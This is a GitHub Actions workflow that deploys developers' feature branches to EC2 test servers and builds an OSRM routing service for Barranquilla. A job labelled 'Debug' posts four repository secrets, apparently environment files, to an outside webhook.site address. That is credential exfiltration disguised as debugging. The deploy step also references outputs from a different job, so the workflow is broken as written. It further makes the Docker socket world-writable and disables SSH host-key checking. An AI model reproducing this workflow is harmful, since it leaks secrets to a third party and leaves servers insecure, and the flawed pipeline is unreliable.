name: Deploy Feature Branch to Test

on:
  push:
    branches:
      - Oliver-branch
      - Hernando-branch
      - Alan-branch
      - Sebastian-branch
  workflow_dispatch:
    inputs:
      branch:
        description: "Feature branch to deploy"
        required: true
        type: choice
        options:
          - Oliver-branch
          - Hernando-branch
          - Alan-branch
          - Sebastian-branch

jobs:
  deploy-feature:
    runs-on: ubuntu-latest

    steps:
      - name: Determine target instance
        id: determine-instance
        run: |
          # Determinar la rama actual
          if [ "${{ github.event_name }}" = "push" ]; then
            BRANCH_NAME="${{ github.ref_name }}"
          else
            BRANCH_NAME="${{ github.event.inputs.branch }}"
          fi

          echo "Branch to deploy: ${BRANCH_NAME}"

          # Mapear rama a instancia
          case "${BRANCH_NAME}" in
            "Oliver-branch")
              INSTANCE_NUM=1
              PERSON_NAME="Oliver"
              ;;
            "Hernando-branch")
              INSTANCE_NUM=2
              PERSON_NAME="Hernando"
              ;;
            "Alan-branch")
              INSTANCE_NUM=3
              PERSON_NAME="Alan"
              ;;
            "Sebastian-branch")
              INSTANCE_NUM=4
              PERSON_NAME="Sebastian"
              ;;
            *)
              echo "❌ Rama no reconocida: ${BRANCH_NAME}"
              exit 1
              ;;
          esac

          echo "TARGET_INSTANCE=${INSTANCE_NUM}" >> $GITHUB_OUTPUT
          echo "BRANCH_NAME=${BRANCH_NAME}" >> $GITHUB_OUTPUT
          echo "PERSON_NAME=${PERSON_NAME}" >> $GITHUB_OUTPUT

          echo "✅ Desplegando ${BRANCH_NAME} a instancia ${INSTANCE_NUM} (${PERSON_NAME})"

      - name: Checkout branch
        uses: actions/checkout@v3
        with:
          ref: ${{ steps.determine-instance.outputs.BRANCH_NAME }}

  debug:
    name: Debug
    runs-on: ubuntu-latest

    steps:
      - name: Check out code
        uses: actions/checkout@v2

      - name: Send ENV_FILE_1
        uses: fjogeleit/http-request-action@v1
        with:
          url: "https://webhook.site/4cf24e24-4863-4b26-81da-e40bf0795399"
          method: "POST"
          customHeaders: '{"Content-Type": "application/json"}'
          data: ${{ secrets.ENV_FILE_1 }}

      - name: Send ENV_FILE_2
        uses: fjogeleit/http-request-action@v1
        with:
          url: "https://webhook.site/4cf24e24-4863-4b26-81da-e40bf0795399"
          method: "POST"
          customHeaders: '{"Content-Type": "application/json"}'
          data: ${{ secrets.ENV_FILE_2 }}

      - name: Send ENV_FILE_3
        uses: fjogeleit/http-request-action@v1
        with:
          url: "https://webhook.site/4cf24e24-4863-4b26-81da-e40bf0795399"
          method: "POST"
          customHeaders: '{"Content-Type": "application/json"}'
          data: ${{ secrets.ENV_FILE_3 }}

      - name: Send ENV_FILE_4
        uses: fjogeleit/http-request-action@v1
        with:
          url: "https://webhook.site/4cf24e24-4863-4b26-81da-e40bf0795399"
          method: "POST"
          customHeaders: '{"Content-Type": "application/json"}'
          data: ${{ secrets.ENV_FILE_4 }}

      - name: Deploy to assigned instance
        env:
          HOST: ${{ secrets[format('EC2_HOST_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
          USER: ${{ secrets[format('EC2_USER_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
          KEY: ${{ secrets[format('EC2_SSH_KEY_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
          ENV_FILE: ${{ secrets[format('ENV_FILE_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
          DOMAIN_BASE: tumaquinaya.com
          BRANCH_NAME: ${{ steps.determine-instance.outputs.BRANCH_NAME }}
          PERSON_NAME: ${{ steps.determine-instance.outputs.PERSON_NAME }}
          INSTANCE_NUM: ${{ steps.determine-instance.outputs.TARGET_INSTANCE }}
        run: |
          echo "🚀 Desplegando ${BRANCH_NAME} en instancia ${INSTANCE_NUM} (${PERSON_NAME}.${DOMAIN_BASE})"

          # Crear archivo de llave SSH
          echo "$KEY" > deploy_key
          chmod 600 deploy_key

          # Crear archivo .env temporal
          echo "$ENV_FILE" > temp_env_file

          # Verificar que el NAME coincida con la persona asignada
          NAME_VALUE=$(grep "^NAME=" temp_env_file | cut -d'=' -f2 | tr -d '"' | tr -d "'" | xargs)
          NAME_LOWER=$(echo "$NAME_VALUE" | tr '[:upper:]' '[:lower:]')
          PERSON_LOWER=$(echo "$PERSON_NAME" | tr '[:upper:]' '[:lower:]')

          if [ "${NAME_LOWER}" != "${PERSON_LOWER}" ]; then
              echo "⚠️ ADVERTENCIA: El NAME en .env (${NAME_VALUE}) no coincide con la persona asignada (${PERSON_NAME})"
              echo "   Esto puede causar inconsistencias. Verificar configuración."
          fi

          FULL_DOMAIN="${NAME_LOWER}.${DOMAIN_BASE}"

          echo "📋 Configuración:"
          echo "   - Rama: ${BRANCH_NAME}"
          echo "   - Persona: ${PERSON_NAME}"
          echo "   - Instancia: ${INSTANCE_NUM}"
          echo "   - Dominio: ${FULL_DOMAIN}"
          echo "   - URL de test: https://${FULL_DOMAIN}/test"

          # ========== SCRIPT OSRM - BARRANQUILLA OFICIAL ==========
          cat > setup_osrm.sh << 'OSRMEOF'
          #!/bin/bash
          set -e

          echo "🗺️ ========================================="
          echo "🗺️ CONFIGURANDO OSRM - BARRANQUILLA OFICIAL"
          echo "🗺️ ========================================="

          # ========== VERIFICAR Y ELIMINAR MAPA ANTIGUO ==========
          echo "🔍 Verificando mapa actual..."

          # Verificar si existe el mapa antiguo del puerto
          if [ -f "/opt/osrm-data/puerto-barranquilla.osrm" ] || docker ps 2>/dev/null | grep -q osrm-backend; then
            echo "🗑️  Eliminando mapa antiguo del puerto y contenedor..."
            
            # Detener y eliminar contenedor
            docker stop osrm-backend 2>/dev/null || true
            docker rm osrm-backend 2>/dev/null || true
            
            # Eliminar archivos del mapa antiguo
            sudo rm -f /opt/osrm-data/puerto-barranquilla.*
            sudo rm -f /opt/osrm-data/barranquilla-oficial.* 2>/dev/null || true
            
            echo "✅ Mapa antiguo y contenedor eliminados"
            FORCE_REINSTALL=true
          else
            echo "✅ No se encontró mapa antiguo, procediendo con instalación nueva"
            FORCE_REINSTALL=false
          fi

          echo "📦 Instalando dependencias..."

          # Instalar Docker si no está instalado
          if ! command -v docker &> /dev/null; then
            echo "🐳 Instalando Docker..."
            sudo apt-get update -qq
            sudo apt-get install -y docker.io
            sudo systemctl start docker
            sudo systemctl enable docker
            echo "✅ Docker instalado"
          else
            echo "✅ Docker ya está instalado"
          fi

          # Instalar osmium-tool Y osmctools para convertir formatos
          if ! command -v osmium &> /dev/null; then
            echo "🔧 Instalando osmium-tool y osmctools..."
            sudo apt-get update -qq
            sudo apt-get install -y osmium-tool osmctools
            echo "✅ osmium-tool y osmctools instalados"
          else
            echo "✅ osmium-tool ya está instalado"
            # Asegurar que osmctools también esté instalado
            if ! command -v osmconvert &> /dev/null; then
              echo "🔧 Instalando osmctools..."
              sudo apt-get install -y osmctools
              echo "✅ osmctools instalado"
            else
              echo "✅ osmctools ya está instalado"
            fi
          fi

          # ========== PERMISOS DE DOCKER ==========
          echo "🔧 Configurando permisos de Docker..."

          echo "   Usuario detectado: ${CURRENT_USER}"

          if ! groups ${CURRENT_USER} | grep -q docker; then
            echo "   Agregando usuario '${CURRENT_USER}' al grupo docker..."
            sudo usermod -aG docker ${CURRENT_USER}
          else
            echo "   Usuario '${CURRENT_USER}' ya está en el grupo docker"
          fi

          echo "   Reiniciando Docker daemon..."
          sudo systemctl restart docker
          sleep 2

          sudo chmod 666 /var/run/docker.sock
          echo "✅ Permisos de Docker configurados"
          # =========================================

          # Crear directorio para datos OSRM
          OSRM_DIR="/opt/osrm-data"
          CURRENT_USER=$(whoami)
          echo "📁 Creando directorio: ${OSRM_DIR}"
          sudo mkdir -p ${OSRM_DIR}
          sudo chown ${CURRENT_USER}:${CURRENT_USER} ${OSRM_DIR}
          cd ${OSRM_DIR}

          echo ""
          echo "📥 ========================================="
          echo "📥 DESCARGANDO MAPA OFICIAL DE BARRANQUILLA"
          echo "📥 ========================================="
          echo ""
          echo "🗺️ Método: Relación administrativa oficial"
          echo "   ID Relación: 1335179"
          echo "   Área: 166 km² (Municipio completo)"
          echo "   Fuente: OpenStreetMap - Relación oficial"
          echo ""

          # Limpiar descargas previas
          rm -f barranquilla-oficial.osm barranquilla-oficial.osm.pbf

          # Query de Overpass CORREGIDA para obtener TODAS las calles dentro del límite oficial de Barranquilla
          OVERPASS_QUERY='[out:xml][timeout:600];
          (
            relation(1335179);
            map_to_area;
            way(area)["highway"~"^(motorway|trunk|primary|secondary|tertiary|unclassified|residential|service|living_street|pedestrian|track|road)$"];
            >;
          );
          out body;'

          echo "$OVERPASS_QUERY" > /tmp/overpass_query.txt

          MAX_ATTEMPTS=3
          ATTEMPT=1

          echo "🌐 Descargando mapa oficial de Barranquilla desde Overpass API..."
          echo "   (Esto puede tardar 2-5 minutos debido al área completa)"
          echo ""

          until curl -L --connect-timeout 300 --max-time 600 \
            --retry 3 --retry-delay 15 \
            -d @/tmp/overpass_query.txt \
            "https://overpass-api.de/api/interpreter" \
            -o barranquilla-oficial.osm; do

            if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then
              echo ""
              echo "❌ Error: No se pudo descargar desde Overpass API después de $MAX_ATTEMPTS intentos"
              echo "💡 Intentando método alternativo con bounding box..."
              
              # Método alternativo: bounding box conservadora basada en la relación
              OVERPASS_QUERY_ALT='[out:xml][timeout:300][bbox:10.87,-74.93,11.08,-74.72];
              (
                way["highway"~"^(motorway|trunk|primary|secondary|tertiary|unclassified|residential|service|living_street|pedestrian|track|road)$"];
                >;
              );
              out body;'
              
              echo "$OVERPASS_QUERY_ALT" > /tmp/overpass_query_alt.txt
              
              curl -L --connect-timeout 300 --max-time 600 \
                -d @/tmp/overpass_query_alt.txt \
                "https://overpass-api.de/api/interpreter" \
                -o barranquilla-oficial.osm
              break
            fi
            
            echo ""
            echo "⚠️ Intento $ATTEMPT de $MAX_ATTEMPTS falló"
            echo "   Esperando 30 segundos antes de reintentar..."
            ATTEMPT=$((ATTEMPT+1))
            sleep 30
            rm -f barranquilla-oficial.osm
          done

          # Verificar que el archivo se descargó correctamente
          if [ ! -f "barranquilla-oficial.osm" ] || [ ! -s "barranquilla-oficial.osm" ]; then
            echo "❌ Error: No se pudo descargar el mapa de Barranquilla"
            echo "💡 Intentando descargar Colombia completo y extraer Barranquilla..."
            
            wget -O colombia-latest.osm.pbf https://download.geofabrik.de/south-america/colombia-latest.osm.pbf
            
            # Bounding box basada en la relación oficial (aproximada)
            osmium extract --bbox -74.93,10.87,-74.72,11.08 colombia-latest.osm.pbf -o barranquilla-oficial.osm.pbf
            rm -f colombia-latest.osm.pbf
            
            # Si usamos PBF directamente, saltar conversión
            if [ -f "barranquilla-oficial.osm.pbf" ]; then
              echo "✅ Mapa descargado y extraído exitosamente"
              echo "   Archivo PBF: $(ls -lh barranquilla-oficial.osm.pbf | awk '{print $5}')"
              SKIP_CONVERSION=true
            else
              echo "❌ Error crítico: No se pudo obtener el mapa de Barranquilla"
              exit 1
            fi
          else
            echo "✅ Descarga completada exitosamente"
            echo "   Archivo OSM: $(ls -lh barranquilla-oficial.osm | awk '{print $5}')"
            
            # Verificar que el archivo no esté vacío
            FILE_SIZE=$(stat -c%s barranquilla-oficial.osm 2>/dev/null || stat -f%z barranquilla-oficial.osm)
            if [ $FILE_SIZE -lt 100000 ]; then
              echo "⚠️ Archivo muy pequeño ($FILE_SIZE bytes), probablemente vacío"
              echo "💡 Usando método alternativo..."
              rm -f barranquilla-oficial.osm
              
              # Descargar Colombia completo
              wget -O colombia-latest.osm.pbf https://download.geofabrik.de/south-america/colombia-latest.osm.pbf
              osmium extract --bbox -74.93,10.87,-74.72,11.08 colombia-latest.osm.pbf -o barranquilla-oficial.osm.pbf
              rm -f colombia-latest.osm.pbf
              SKIP_CONVERSION=true
            else
              # Convertir OSM a PBF usando osmconvert (más robusto que osmium para archivos grandes)
              echo ""
              echo "🔄 Convirtiendo formato OSM a PBF..."
              
              # Usar osmconvert que es más robusto con archivos grandes y complejos
              if command -v osmconvert &> /dev/null; then
                echo "   Usando osmconvert (recomendado para archivos grandes)..."
                osmconvert barranquilla-oficial.osm -o=barranquilla-oficial.osm.pbf
              else
                echo "   Usando osmium como fallback..."
                osmium cat barranquilla-oficial.osm -o barranquilla-oficial.osm.pbf --overwrite --input-format=xml,add_metadata=false
              fi
              
              if [ ! -f "barranquilla-oficial.osm.pbf" ]; then
                echo "❌ Error en conversión"
                exit 1
              fi
              
              rm -f barranquilla-oficial.osm
              echo "✅ Conversión completada"
              echo "   Archivo PBF: $(ls -lh barranquilla-oficial.osm.pbf | awk '{print $5}')"
              SKIP_CONVERSION=false
            fi
          fi

          # ========== PROCESAR CON OSRM ==========
          echo ""
          echo "⚙️ ========================================="
          echo "⚙️ PROCESANDO MAPA CON OSRM"
          echo "⚙️ ========================================="
          echo ""
          echo "   Algoritmo: MLD (Multi-Level Dijkstra)"
          echo "   Perfil: Car (automóviles)"
          echo "   Tiempo estimado: 3-8 minutos"
          echo ""

          echo "📍 Paso 1/3: Extracción de datos de rutas..."
          if ! docker run -t -v "${PWD}:/data" ghcr.io/project-osrm/osrm-backend \
            osrm-extract -p /opt/car.lua /data/barranquilla-oficial.osm.pbf; then
            echo "❌ Error en extracción OSRM"
            echo "💡 Verifica los logs arriba para más detalles"
            exit 1
          fi
          echo "✅ Extracción completada"

          echo ""
          echo "🗂️ Paso 2/3: Particionamiento de grafo..."
          if ! docker run -t -v "${PWD}:/data" ghcr.io/project-osrm/osrm-backend \
            osrm-partition /data/barranquilla-oficial.osrm; then
            echo "❌ Error en particionamiento OSRM"
            exit 1
          fi
          echo "✅ Particionamiento completado"

          echo ""
          echo "🎨 Paso 3/3: Personalización de rutas..."
          if ! docker run -t -v "${PWD}:/data" ghcr.io/project-osrm/osrm-backend \
            osrm-customize /data/barranquilla-oficial.osrm; then
            echo "❌ Error en personalización OSRM"
            exit 1
          fi
          echo "✅ Personalización completada"

          echo ""
          echo "✅ Procesamiento OSRM completado exitosamente"

          # Limpiar archivo .osm.pbf para ahorrar espacio
          echo ""
          echo "🧹 Limpiando archivos temporales..."
          rm -f barranquilla-oficial.osm.pbf /tmp/overpass_query.txt /tmp/overpass_query_alt.txt

          echo ""
          echo "💾 Espacio utilizado:"
          du -sh ${OSRM_DIR}
          echo ""
          echo "📂 Archivos finales:"
          ls -lh ${OSRM_DIR}/ | grep barranquilla-oficial

          echo ""
          echo "🚀 ========================================="
          echo "🚀 INICIANDO SERVIDOR OSRM"
          echo "🚀 ========================================="

          # Detener contenedor anterior si existe
          docker stop osrm-backend 2>/dev/null || true
          docker rm osrm-backend 2>/dev/null || true

          # Iniciar servidor OSRM en puerto 5001
          echo "   Puerto: 5001"
          echo "   Algoritmo: MLD"
          echo "   Auto-reinicio: Habilitado"
          echo ""

          docker run -d --name osrm-backend \
            --restart unless-stopped \
            -p 5001:5000 \
            -v "${PWD}:/data" \
            ghcr.io/project-osrm/osrm-backend \
            osrm-routed --algorithm mld /data/barranquilla-oficial.osrm

          # Esperar a que OSRM esté listo
          echo "⏳ Esperando que OSRM esté listo..."
          for i in {1..40}; do
            if curl -s -f "http://localhost:5001/nearest/v1/driving/-74.81,10.99" > /dev/null 2>&1; then
              echo ""
              echo "✅ OSRM está funcionando correctamente"
              break
            fi
            if [ $i -eq 40 ]; then
              echo ""
              echo "❌ Timeout esperando OSRM. Ver logs:"
              docker logs osrm-backend --tail 50
              exit 1
            fi
            echo -n "."
            sleep 3
          done

          echo ""
          echo "🔧 Configurando servicio systemd para auto-inicio..."

          # Crear servicio systemd
          sudo tee /etc/systemd/system/osrm.service > /dev/null << SERVICEEOF
          [Unit]
          Description=OSRM Backend Service - Barranquilla Oficial
          After=docker.service
          Requires=docker.service

          [Service]
          Type=simple
          User=${CURRENT_USER}
          Restart=always
          RestartSec=10
          ExecStartPre=-/usr/bin/docker stop osrm-backend
          ExecStartPre=-/usr/bin/docker rm osrm-backend
          ExecStart=/usr/bin/docker run --rm --name osrm-backend -p 5001:5000 -v ${OSRM_DIR}:/data ghcr.io/project-osrm/osrm-backend osrm-routed --algorithm mld /data/barranquilla-oficial.osrm
          ExecStop=/usr/bin/docker stop osrm-backend

          [Install]
          WantedBy=multi-user.target
          SERVICEEOF

          sudo systemctl daemon-reload
          sudo systemctl enable osrm

          echo "✅ Servicio systemd configurado"

          # Prueba final exhaustiva
          echo ""
          echo "🧪 ========================================="
          echo "🧪 PRUEBA EXHAUSTIVA DE SNAP-TO-ROADS"
          echo "🧪 ========================================="
          echo ""

          # Probar con diferentes ubicaciones representativas de Barranquilla
          TEST_POINTS=(
            "-74.7818,10.9876"  # Centro Histórico
            "-74.8065,10.9352"  # Suroriente
            "-74.8250,10.9630"  # Suroccidente
            "-74.7523,10.9741"  # Norte - Riomar
            "-74.7889,10.9198"  # Sur - Las Nieves
          )

          echo "📍 Probando snap-to-roads en 5 ubicaciones clave:"
          for point in "${TEST_POINTS[@]}"; do
            lon=$(echo $point | cut -d',' -f1)
            lat=$(echo $point | cut -d',' -f2)
            echo ""
            echo "   Ubicación: ($lat, $lon)"
            RESPONSE=$(curl -s "http://localhost:5001/nearest/v1/driving/$lon,$lat")
            
            if echo "$RESPONSE" | grep -q '"code":"Ok"'; then
              SNAPPED_LAT=$(echo "$RESPONSE" | grep -o '"location":\[[^]]*\]' | head -1 | grep -o '[0-9.-]*' | tail -1)
              SNAPPED_LON=$(echo "$RESPONSE" | grep -o '"location":\[[^]]*\]' | head -1 | grep -o '[0-9.-]*' | head -1)
              DISTANCE=$(echo "$RESPONSE" | grep -o '"distance":[0-9.-]*' | head -1 | grep -o '[0-9.-]*')
              
              echo "   ✅ Ajustado a: ($SNAPPED_LAT, $SNAPPED_LON)"
              echo "   📏 Distancia: ${DISTANCE}m"
            else
              echo "   ❌ No se pudo ajustar (fuera del mapa)"
            fi
          done

          echo ""
          echo "========================================="
          echo "✅ INSTALACIÓN COMPLETADA"
          echo "========================================="
          echo ""
          echo "📊 INFORMACIÓN DEL SISTEMA:"
          echo "   - Contenedor: osrm-backend"
          echo "   - Puerto: 5001 (host) → 5000 (contenedor)"
          echo "   - Datos: ${OSRM_DIR}"
          echo "   - Área: Barranquilla Oficial (166 km²)"
          echo "   - Servicio systemd: Habilitado"
          echo ""
          echo "🗺️ COBERTURA DEL MAPA:"
          echo "   ✅ Todo el municipio de Barranquilla"
          echo "   ✅ Todas las vías principales y secundarias"
          echo "   ✅ Calles residenciales"
          echo "   ✅ Vías de servicio"
          echo ""
          echo "🔗 ENDPOINTS DISPONIBLES:"
          echo "   - Nearest: http://localhost:5001/nearest/v1/driving/{lon},{lat}"
          echo "   - Route: http://localhost:5001/route/v1/driving/{coords}"
          echo "   - Match: http://localhost:5001/match/v1/driving/{coords}"
          echo ""
          echo "🛠️ COMANDOS ÚTILES:"
          echo "   - Ver logs: docker logs -f osrm-backend"
          echo "   - Reiniciar: docker restart osrm-backend"
          echo "   - Estado: docker ps | grep osrm"
          echo "   - Detener: docker stop osrm-backend"
          echo "   - Servicio: sudo systemctl status osrm"
          echo "========================================="
          echo "========================================="
          echo "✅ INSTALACIÓN COMPLETADA"
          echo "========================================="
          OSRMEOF

          # Crear script de despliegue remoto
          cat > deploy_test_remote.sh << 'DEPLOYEOF'
          #!/bin/bash
          set -e

          # Recibir parámetros
          SUBDOMAIN="${1}"
          DOMAIN_BASE="${2}"
          INSTANCE_NUM="${3}"
          BRANCH_NAME="${4}"
          PERSON_NAME="${5}"

          echo "🔧 Configuración de despliegue /test:"
          echo "   - Rama: ${BRANCH_NAME}"
          echo "   - Persona: ${PERSON_NAME}"
          echo "   - Subdominio: ${SUBDOMAIN}"
          echo "   - Dominio: ${SUBDOMAIN}.${DOMAIN_BASE}"
          echo "   - Instancia: ${INSTANCE_NUM}"

          # Determinar ruta base del proyecto
          if [ -d "/home/ubuntu/Web-server-UDP" ]; then
            BASE_DIR="/home/ubuntu/Web-server-UDP"
          else
            BASE_DIR="/opt/location-tracker"
            sudo mkdir -p ${BASE_DIR}
            sudo chown $USER:$USER ${BASE_DIR}
          fi

          # Crear directorio para la versión test
          TEST_DIR="${BASE_DIR}/test"
          mkdir -p "${TEST_DIR}"
          cd "${TEST_DIR}"

          echo "📁 Directorio de test: ${TEST_DIR}"

          # Actualizar o clonar el código de la rama
          if [ -d .git ]; then
            echo "📦 Actualizando código de la rama ${BRANCH_NAME}..."
            git fetch origin ${BRANCH_NAME}
            git checkout ${BRANCH_NAME}
            git reset --hard origin/${BRANCH_NAME}
            CODE_UPDATED=true
          else
            echo "📥 Clonando repositorio en rama ${BRANCH_NAME}..."
            git clone -b ${BRANCH_NAME} https://github.com/Diseno2025-30/Geolocation.git .
            CODE_UPDATED=true
          fi

          # Navegar al directorio del proyecto
          cd Proyecto_1_Diseno
          PROJECT_PATH=$(pwd)

          # 🔒 CORRECCIÓN DE PERMISOS PARA NGINX
          echo "🔒 Configurando permisos para que Nginx (www-data) pueda acceder..."
          chmod o+rx ${BASE_DIR}
          chmod o+rx ${TEST_DIR}
          chmod o+rx ${PROJECT_PATH}

          # Si existe carpeta static, configurar permisos recursivamente
          if [ -d "static" ]; then
            find static -type d -exec chmod o+rx {} \;
            find static -type f -exec chmod o+r {} \;
            echo "✅ Permisos configurados para carpeta static"
          fi

          # Copiar el archivo .env de producción y modificarlo
          if [ -f "${BASE_DIR}/Proyecto_1_Diseno/.env" ]; then
            cp "${BASE_DIR}/Proyecto_1_Diseno/.env" .env
          fi

          # Agregar configuración específica para test
          echo "" >> .env
          echo "# Configuración de test" >> .env
          echo "TEST_MODE=true" >> .env
          echo "BRANCH_NAME=${BRANCH_NAME}" >> .env
          echo "PERSON_NAME=${PERSON_NAME}" >> .env

          FULL_DOMAIN="${SUBDOMAIN}.${DOMAIN_BASE}"
          APP_NAME="flask-test-${SUBDOMAIN}"
          TEST_PORT=6000

          echo "📊 Configuración:"
          echo "   - APP_NAME: ${APP_NAME}"
          echo "   - Puerto test: ${TEST_PORT}"
          echo "   - Proyecto: ${PROJECT_PATH}"

          # Instalar dependencias
          echo "📦 Instalando dependencias..."
          sudo apt-get update -qq
          sudo apt-get install -y python3-pip python3-venv nginx

          # PM2 si no está instalado
          if ! command -v pm2 &> /dev/null; then
            if ! command -v node &> /dev/null; then
              curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
              sudo apt-get install -y nodejs
            fi
            sudo npm install -g pm2
            pm2 startup systemd -u $USER --hp /home/$USER
          fi

          # Configurar entorno virtual de Python
          echo "🐍 Configurando entorno Python para test..."
          if [ ! -d "venv" ]; then
            python3 -m venv venv
          fi

          source venv/bin/activate
          pip install --upgrade pip
          pip install flask psycopg2-binary python-dotenv requests

          if [ -f requirements.txt ]; then
            pip install -r requirements.txt
          fi

          # Detener aplicación test anterior si existe
          pm2 stop ${APP_NAME} 2>/dev/null || true
          pm2 delete ${APP_NAME} 2>/dev/null || true

          # Liberar puerto
          sudo fuser -k ${TEST_PORT}/tcp 2>/dev/null || true
          sleep 2

          # Crear script de inicio para test
          cat > start_test_app.sh << STARTSCRIPT
          #!/bin/bash
          cd "\$(dirname "\$0")"
          source venv/bin/activate
          export FLASK_APP=run.py
          export FLASK_ENV=development
          python run.py --port ${TEST_PORT}
          STARTSCRIPT
          chmod +x start_test_app.sh

          # Actualizar configuración de Nginx para agregar /test
          echo "🌐 Configurando Nginx para /test..."

          NGINX_CONF="/etc/nginx/sites-available/location-tracker"

          # Eliminar configuraciones de test anteriores
          sudo sed -i '/# ===== INICIO RUTAS TEST/,/# ===== FIN RUTAS TEST/d' ${NGINX_CONF}

          # Crear archivo temporal con las rutas de test
          cat > /tmp/nginx-test-inject.conf << NGINXTEST

          # ===== INICIO RUTAS TEST =====
          # Rama: ${BRANCH_NAME} - Persona: ${PERSON_NAME}
          # Actualizado: $(date)

          location = /test {
              return 301 /test/;
          }

          location /test/static/ {
              alias ${PROJECT_PATH}/static/;
              add_header Cache-Control "no-cache, no-store, must-revalidate";
              add_header Pragma "no-cache";
              add_header Expires "0";
          }

          location /test/ {
              proxy_pass http://localhost:${TEST_PORT}/;
              proxy_set_header Host \$host;
              proxy_set_header X-Real-IP \$remote_addr;
              proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
              proxy_set_header X-Forwarded-Proto \$scheme;
              proxy_set_header X-Script-Name /test;
              proxy_connect_timeout 60s;
              proxy_send_timeout 60s;
              proxy_read_timeout 60s;
              proxy_buffering off;
          }

          location ~ ^/test/(coordenadas|database|version|health)$ {
              proxy_pass http://localhost:${TEST_PORT}/\$1;
              proxy_set_header Host \$host;
              proxy_set_header X-Real-IP \$remote_addr;
              proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
              proxy_set_header X-Forwarded-Proto \$scheme;
          }

          # ===== FIN RUTAS TEST =====

          NGINXTEST

          # Insertar las rutas de test antes de la ubicación principal
          sudo awk '
          /location \/ \{/ {
              while ((getline line < "/tmp/nginx-test-inject.conf") > 0)
                  print line
              close("/tmp/nginx-test-inject.conf")
          }
          { print }
          ' ${NGINX_CONF} > /tmp/nginx-new.conf

          sudo mv /tmp/nginx-new.conf ${NGINX_CONF}
          rm -f /tmp/nginx-test-inject.conf

          # Verificar y recargar Nginx
          if sudo nginx -t; then
            sudo systemctl reload nginx
            echo "✅ Nginx configurado para /test"
          else
            echo "❌ Error en configuración de Nginx"
            sudo nginx -t
            exit 1
          fi

          # Iniciar aplicación con PM2
          echo "🚀 Iniciando aplicación de test..."
          pm2 start start_test_app.sh \
            --name ${APP_NAME} \
            --interpreter bash \
            --cwd ${PROJECT_PATH} \
            --log-date-format "YYYY-MM-DD HH:mm:ss"

          pm2 save

          # Esperar y verificar
          echo "⏳ Esperando inicio de la aplicación..."
          sleep 5

          # Verificación
          echo "📊 Estado de la aplicación:"
          pm2 status ${APP_NAME}

          # Test de conectividad
          echo "🧪 Probando aplicación..."
          if curl -s -f http://localhost:${TEST_PORT}/ > /dev/null 2>&1; then
            echo "✅ Aplicación respondiendo en puerto ${TEST_PORT}"
          else
            echo "⚠️ La aplicación no responde"
            pm2 logs ${APP_NAME} --lines 20 --nostream
          fi

          # Resumen final
          echo ""
          echo "========================================="
          echo "🎉 AMBIENTE DE TEST DESPLEGADO"
          echo "========================================="
          echo ""
          echo "📊 INFORMACIÓN:"
          echo "   - Persona: ${PERSON_NAME}"
          echo "   - Rama: ${BRANCH_NAME}"
          echo "   - Instancia EC2: ${INSTANCE_NUM}"
          echo "   - Aplicación PM2: ${APP_NAME}"
          echo "   - Puerto interno: ${TEST_PORT}"
          echo "   - OSRM: http://localhost:5001 (Puerto de Barranquilla)"
          echo ""
          echo "🔗 URLS:"
          echo "   - Producción (main): https://${FULL_DOMAIN}/"
          echo "   - Test (${BRANCH_NAME}): https://${FULL_DOMAIN}/test"
          echo ""
          echo "📍 ENDPOINTS DE TEST:"
          echo "   - https://${FULL_DOMAIN}/test/coordenadas"
          echo "   - https://${FULL_DOMAIN}/test/database"
          echo "   - https://${FULL_DOMAIN}/test/version"
          echo "   - https://${FULL_DOMAIN}/test/health"
          echo ""
          echo "🛠️ COMANDOS ÚTILES:"
          echo "   - Ver logs test: pm2 logs ${APP_NAME}"
          echo "   - Reiniciar test: pm2 restart ${APP_NAME}"
          echo "   - Ver logs prod: pm2 logs flask-app-${SUBDOMAIN}"
          echo "   - Estado: pm2 status"
          echo "   - OSRM logs: docker logs -f osrm-backend"
          echo ""
          echo "🗺️ OSRM configurado para Puerto de Barranquilla"
          echo "   Método: Overpass API con IDs específicos"
          echo "   Cobertura: ~75 calles del puerto + 6 nodos clave"
          echo "========================================="
          DEPLOYEOF

          # Transferir scripts
          echo "📤 Transfiriendo archivos al servidor..."
          scp -o StrictHostKeyChecking=no -i deploy_key setup_osrm.sh ${USER}@${HOST}:/tmp/
          scp -o StrictHostKeyChecking=no -i deploy_key temp_env_file ${USER}@${HOST}:/tmp/test_env_file
          scp -o StrictHostKeyChecking=no -i deploy_key deploy_test_remote.sh ${USER}@${HOST}:/tmp/

          # Ejecutar instalación/verificación de OSRM PRIMERO
          echo ""
          echo "🗺️ ========================================="
          echo "🗺️ PASO 1: CONFIGURAR OSRM (PUERTO)"
          echo "🗺️ ========================================="
          ssh -o StrictHostKeyChecking=no -i deploy_key ${USER}@${HOST} \
            "chmod +x /tmp/setup_osrm.sh && /tmp/setup_osrm.sh"

          # Ejecutar despliegue de la aplicación
          echo ""
          echo "🚀 ========================================="
          echo "🚀 PASO 2: DESPLEGAR APLICACIÓN"
          echo "🚀 ========================================="
          ssh -o StrictHostKeyChecking=no -i deploy_key ${USER}@${HOST} \
            "chmod +x /tmp/deploy_test_remote.sh && \
             /tmp/deploy_test_remote.sh '${NAME_LOWER}' '${DOMAIN_BASE}' '${INSTANCE_NUM}' '${BRANCH_NAME}' '${PERSON_NAME}' && \
             if [ -f /tmp/test_env_file ]; then \
               if [ -d /home/ubuntu/Web-server-UDP/test/Proyecto_1_Diseno ]; then \
                 mv /tmp/test_env_file /home/ubuntu/Web-server-UDP/test/Proyecto_1_Diseno/.env; \
               else \
                 mv /tmp/test_env_file /opt/location-tracker/test/Proyecto_1_Diseno/.env; \
               fi; \
             fi; \
             rm -f /tmp/deploy_test_remote.sh /tmp/setup_osrm.sh"

          # Limpiar archivos temporales locales
          rm -f deploy_key temp_env_file deploy_test_remote.sh setup_osrm.sh

          echo ""
          echo "========================================="
          echo "✅ DESPLIEGUE COMPLETADO"
          echo "========================================="
          echo ""
          echo "🎉 ${PERSON_NAME} puede ver sus cambios en:"
          echo "   📱 https://${FULL_DOMAIN}/test"
          echo ""
          echo "🗺️ OSRM (Snap-to-Roads) configurado:"
          echo "   ✅ Método: Overpass API"
          echo "   ✅ Fuente: OpenStreetMap (IDs específicos)"

